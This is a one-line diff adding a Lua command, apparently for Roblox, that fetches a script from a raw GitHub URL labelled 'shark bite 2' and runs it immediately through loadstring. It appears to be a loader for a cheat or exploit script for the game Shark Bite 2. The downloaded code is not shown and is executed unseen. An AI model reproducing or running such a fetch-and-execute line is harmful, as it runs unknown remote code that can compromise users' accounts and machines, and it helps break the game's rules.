@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hamza12436/2/main/shark%20bite%202"))()
